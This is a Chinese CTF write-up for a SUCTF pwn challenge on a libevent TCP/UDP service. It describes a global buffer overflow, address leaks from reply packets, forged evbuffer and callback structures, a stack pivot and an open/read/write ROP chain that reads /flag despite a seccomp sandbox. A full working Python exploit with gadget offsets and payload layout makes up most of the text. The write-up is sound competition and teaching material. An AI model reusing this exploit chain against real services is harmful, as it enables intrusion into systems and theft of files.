# SU_evbuffer

## 题目简述
题目是 libevent/evbuffer 相关 Pwn，环境为 `ubuntu:22.04`，保护开启 Full RELRO、Canary、NX、PIE，并用 seccomp 禁止直接 `execve/execveat`。目标程序同时监听 TCP 8888 和 UDP 8889，两条路径都会先把输入交给 `inet_pton`，随后把最多 `0x3ff` 字节拷贝到很小的全局状态区，形成稳定全局溢出。

题目的关键不是覆盖返回地址，而是利用 TCP/UDP 两条路径的全局对象布局差异：回复包会泄漏 PIE 与 libevent 地址；UDP 溢出可以伪造全局 `bufferevent`/`evbuffer` 相关指针；TCP 触发 `evbuffer_add_reference()` 后进入 callback 调用链。由于沙箱限制，最终利用目标是伪造 evbuffer/callback 完成栈迁移并构造 ORW。

## 解题过程
题目信息

- 目标程序同时监听 TCP 8888 和 UDP 8889

- 开启了 Full RELRO 、Canary 、NX 、PIE

只拦了 execve/execveat ，所以思路不是直接弹 shell，而是走 ORW• seccomp

漏洞点

核心处理函数是 sub_13A4 。

它会先把输入当成 IPv4 字符串喂给 inet_pton ，然后无条件执行：

```
memcpy(dest, src, n);
```

但是 dest 分别指向两个很小的全局区：

路径写到 0x4040 开始的全局状态• UDP

路径写到 0x4078 开始的全局状态• TCP

而 n 最多能到 0x3ff ，所以是一个稳定的全局溢出。

信息泄漏

程序的回复固定是 0x50 字节。回复包前 16 字节是可预期内容，后面会把 gethostname 使用过
的栈区原样带出来。

实测可以稳定泄出：

回复最后一个 qword：PIE 内地址• UDP

回复最后一个 qword：libevent 内地址• TCP

因此可以直接计算：

- pie_base = udp_leak[9] - 0x1619
- libevent_base = tcp_leak[9] - 0x13b1a

利用思路

### 8.1 利用 UDP 溢出伪造全局对象

UDP 路径从 0x4040 开始覆盖，能改到：
- 0x4050 这块可控槽位
- 0x4098 标志位

保存的 bufferevent * • 0x40a0

把：

- *(0x4098) = 1
- *(0x40a0) = fake_bev

然后令 fake_bev + 0x118 == 0x4050 。

因为 bufferevent_get_output() 本质只是：

```
mov rax, [rdi+0x118]
ret
```

这样后续 TCP 触发时，evbuffer_add_reference() 的目标 evbuffer * 就变成我们伪造的
对象。

### 8.2 伪造 fake evbuffer 和 callback entry

evbuffer_add_reference() 会把一个新建 chain 插进 evbuffer ，然后调用
evbuffer_invoke_callbacks_() 。

我们把 fake evbuffer 放在 pie_base + 0x4140 ，把 callback 链表头放在 pie_base +
0x41c0 ，核心字段只需要满足最小调用条件即可。

关键技巧是让 callback 的函数指针变成：
- add rsp, 8 ; ret at pie_base + 0x1012

同时把 fake evbuffer 里长度相关字段布置成：
- [rsp] = pop rsp ; ret
- [rsp+8] = rop_stack

这样 callback 被调用时，会变成：

1. ret 到 add rsp, 8 ; ret

2. 跳到我们伪造出来的 pop rsp ; ret

3. 栈迁移到 .bss 中的 rop_stack

### 8.3 ORW

libevent 里可直接用的符号和 gadget 足够：
- open@plt = libevent_base + 0xcb24
- read@plt = libevent_base + 0xc904
- write@plt = libevent_base + 0xc714
- pop rsp ; ret = libevent_base + 0xcf2d
- pop rsi ; ret = libevent_base + 0xd2e5
- pop rdx ; pop rbx ; pop rbp ; pop r12 ; ret = libevent_base +
0x339dd• pop rdi ; ret = pie_base + 0x194b

远端直接读 /flag ：

$$
1. open("/flag", 0)
$$

2. read(flag_fd, buf, 0x80)

3. write(sock_fd, buf, 0x80)

### Exp:

```python
#!/usr/bin/env python3
import argparse
import re
import socket
import struct
import sys
import time
from typing import Iterable, List, Optional, Sequence, Tuple

DEFAULT_HOST = "<target>"
DEFAULT_PAIRS: Sequence[Tuple[int, int]] = (
(10000, 10010),
(10001, 10011),
(10002, 10012),
(10003, 10013),
(10004, 10014),
(10005, 10015),
(10006, 10016),
)

def p64(value: int) -> bytes:
return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)

def p32(value: int) -> bytes:
return struct.pack("<I", value & 0xFFFFFFFF)

def u64(data: bytes) -> int:
return struct.unpack("<Q", data)[0]

def qwords(data: bytes) -> List[int]:
return [u64(data[i : i + 8]) for i in range(0, len(data), 8)]

def recv_exact(sock: socket.socket, size: int) -> bytes:
chunks = []
left = size
while left > 0:
chunk = sock.recv(left)
if not chunk:
break
chunks.append(chunk)
left -= len(chunk)
return b"".join(chunks)

def recv_some(sock: socket.socket, timeout: float) -> bytes:
sock.settimeout(timeout)
chunks = []
deadline = time.time() + timeout

while time.time() < deadline:
try:
chunk = sock.recv(4096)
except socket.timeout:
break
if not chunk:
break
chunks.append(chunk)
if b"}" in chunk:
break
return b"".join(chunks)

def extract_flag(data: bytes) -> Optional[str]:
match = re.search(rb"(?:flag|[A-Za-z0-9_]+)\{[^}\r\n]+\}", data)
if match:
return match.group(0).decode(errors="ignore")
return None

def probe_pair(host: str, tcp_port: int, udp_port: int, timeout: float) ->
Optional[float]:
started = time.time()
try:
with socket.create_connection((host, tcp_port), timeout=timeout) as
tcp_sock:
tcp_sock.settimeout(timeout)
tcp_sock.sendall(b"127.0.0.1")
data = recv_exact(tcp_sock, 80)
if len(data) != 80:
return None
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_sock:
udp_sock.settimeout(timeout)
udp_sock.sendto(b"127.0.0.1", (host, udp_port))
data, _ = udp_sock.recvfrom(80)
if len(data) != 80:
return None
except OSError:
return None
return time.time() - started

def choose_pair(host: str, timeout: float, verbose: bool) -> Tuple[int, int]:
best: Optional[Tuple[float, Tuple[int, int]]] = None
for tcp_port, udp_port in DEFAULT_PAIRS:
elapsed = probe_pair(host, tcp_port, udp_port, timeout)
if verbose:
if elapsed is None:
print(f"[-] {tcp_port}/{udp_port} timeout", file=sys.stderr)
else:

print(f"[+] {tcp_port}/{udp_port} ok in {elapsed:.3f}s",
file=sys.stderr)
if elapsed is None:
continue
if best is None or elapsed < best[0]:
best = (elapsed, (tcp_port, udp_port))
if best is None:
raise RuntimeError("no responsive target pair found")
return best[1]

def build_payload(
pie_base: int,
libevent_base: int,
path: bytes,
sock_fd: int,
flag_fd: int,
udp_fd: int = 6,
) -> bytes:
base = pie_base + 0x4040
fake_ev = pie_base + 0x4140
fake_cb = pie_base + 0x41C0
rop_stack = pie_base + 0x4240
path_addr = pie_base + 0x4380
buf_addr = pie_base + 0x43C0
fake_bev = pie_base + 0x3F38

add_rsp_8_ret = pie_base + 0x1012
pop_rdi = pie_base + 0x194B
exit_plt = pie_base + 0x11D0

pop_rsp_ret = libevent_base + 0xCF2D
pop_rsi = libevent_base + 0xD2E5
pop_rdx_rbx_rbp_r12 = libevent_base + 0x339DD
open_plt = libevent_base + 0xCB24
read_plt = libevent_base + 0xC904
write_plt = libevent_base + 0xC714

payload = bytearray(b"\x00" * 0x420)
payload[:10] = b"127.0.0.1\x00"
payload[0x10:0x18] = p64(fake_ev)
payload[0x30:0x34] = p32(udp_fd)
payload[0x58:0x5C] = p32(1)
payload[0x60:0x68] = p64(fake_bev)

fake_ev_off = 0x100
payload[fake_ev_off + 0x10 : fake_ev_off + 0x18] = p64(fake_ev)

payload[fake_ev_off + 0x18 : fake_ev_off + 0x20] = p64((pop_rsp_ret +
rop_stack - 0x50) & 0xFFFFFFFFFFFFFFFF)
payload[fake_ev_off + 0x20 : fake_ev_off + 0x28] = p64(rop_stack - 0x50)
payload[fake_ev_off + 0x78 : fake_ev_off + 0x80] = p64(fake_cb)

fake_cb_off = fake_cb - base
payload[fake_cb_off + 0x10 : fake_cb_off + 0x18] = p64(add_rsp_8_ret)
payload[fake_cb_off + 0x20 : fake_cb_off + 0x24] = p32(1)

rop = [
pop_rdi,
path_addr,
pop_rsi,
0,
open_plt,
pop_rdi,
flag_fd,
pop_rsi,
buf_addr,
pop_rdx_rbx_rbp_r12,
0x80,
0,
0,
0,
read_plt,
pop_rdi,
sock_fd,
pop_rsi,
buf_addr,
pop_rdx_rbx_rbp_r12,
0x80,
0,
0,
0,
write_plt,
pop_rdi,
0,
exit_plt,
]
rop_bytes = b"".join(p64(x) for x in rop)
rop_off = rop_stack - base
payload[rop_off : rop_off + len(rop_bytes)] = rop_bytes

path_off = path_addr - base
payload[path_off : path_off + len(path)] = path
return bytes(payload)

def leak_bases(host: str, tcp_port: int, udp_port: int, timeout: float) ->
Tuple[socket.socket, int, int]:
tcp_sock = socket.create_connection((host, tcp_port), timeout=timeout)
tcp_sock.settimeout(timeout)
tcp_sock.sendall(b"127.0.0.1")
tcp_leak = recv_exact(tcp_sock, 80)
if len(tcp_leak) != 80:
tcp_sock.close()
raise RuntimeError(f"short tcp leak: {len(tcp_leak)}")
libevent_base = qwords(tcp_leak)[9] - 0x13B1A

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_sock:
udp_sock.settimeout(timeout)
udp_sock.sendto(b"127.0.0.1", (host, udp_port))
udp_leak, _ = udp_sock.recvfrom(80)
if len(udp_leak) != 80:
tcp_sock.close()
raise RuntimeError(f"short udp leak: {len(udp_leak)}")
pie_base = qwords(udp_leak)[9] - 0x1619
return tcp_sock, pie_base, libevent_base

def exploit_once(
host: str,
tcp_port: int,
udp_port: int,
timeout: float,
path: bytes,
sock_fd: int,
verbose: bool,
) -> Optional[str]:
tcp_sock, pie_base, libevent_base = leak_bases(host, tcp_port, udp_port,
timeout)
if verbose:
print(
f"[*] pair={tcp_port}/{udp_port} pie={hex(pie_base)} libevent=
{hex(libevent_base)} sock_fd={sock_fd}",
file=sys.stderr,
)
payload = build_payload(
pie_base=pie_base,
libevent_base=libevent_base,
path=path,
sock_fd=sock_fd,
flag_fd=sock_fd + 1,
)
with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_sock:
udp_sock.settimeout(timeout)

udp_sock.sendto(payload, (host, udp_port))
try:
udp_sock.recvfrom(80)
except OSError:
pass

tcp_sock.sendall(b"127.0.0.1")
time.sleep(0.3)
output = recv_some(tcp_sock, timeout=2.0)
tcp_sock.close()
return extract_flag(output)

def exploit(
host: str,
tcp_port: int,
udp_port: int,
timeout: float,
paths: Iterable[str],
sock_fd_guesses: Sequence[int],
retries: int,
verbose: bool,
) -> str:
last_error: Optional[Exception] = None
for path in paths:
path_bytes = path.encode() + b"\x00"
for sock_fd in sock_fd_guesses:
for attempt_index in range(1, retries + 1):
try:
flag = exploit_once(host, tcp_port, udp_port, timeout,
path_bytes, sock_fd, verbose)
if flag:
if verbose:
print(
f"[+] success path={path!r} sock_fd={sock_fd}
attempt={attempt_index}",
file=sys.stderr,
)
return flag
except Exception as exc: # noqa: BLE001
last_error = exc
if verbose:
print(
f"[-] path={path!r} sock_fd={sock_fd} attempt=
{attempt_index}: {exc}",
file=sys.stderr,
)
time.sleep(0.5)

if last_error is not None:
raise RuntimeError(f"exploit failed: {last_error}")
raise RuntimeError("exploit failed without detailed error")

def parse_sock_guesses(raw: str) -> List[int]:
return [int(item) for item in raw.split(",") if item.strip()]

def main() -> None:
parser = argparse.ArgumentParser(description="Exploit for SUCTF pwn
challenge")
parser.add_argument("--host", default=DEFAULT_HOST)
parser.add_argument("--tcp-port", type=int)
parser.add_argument("--udp-port", type=int)
parser.add_argument("--timeout", type=float, default=5.0)
parser.add_argument("--retries", type=int, default=2)
parser.add_argument("--paths", default="/flag,/workspace/flag")
parser.add_argument("--sock-fds", default="8,9,10,11,12")
parser.add_argument("--verbose", action="store_true")
args = parser.parse_args()

if args.tcp_port is None or args.udp_port is None:
tcp_port, udp_port = choose_pair(args.host, args.timeout, args.verbose)
else:
tcp_port, udp_port = args.tcp_port, args.udp_port

if args.verbose:
print(f"[*] using pair tcp={tcp_port} udp={udp_port}", file=sys.stderr)

flag = exploit(
host=args.host,
tcp_port=tcp_port,
udp_port=udp_port,
timeout=args.timeout,
paths=[item for item in args.paths.split(",") if item],
sock_fd_guesses=parse_sock_guesses(args.sock_fds),
retries=args.retries,
verbose=args.verbose,
)
print(flag)

if __name__ == "__main__":
main()
#flag{80e59f78-d2a3-4e6a-bbbf-8027d25c2b9b}
```

## 方法总结
- 核心技巧：全局溢出伪造 libevent 对象
- 识别信号：网络服务把长输入复制到固定全局缓冲区，回复包泄露栈/库指针。
- 复用要点：用 UDP/TCP 两条路径分别泄露和覆盖，伪造 evbuffer/callback entry，触发 ORW 链。
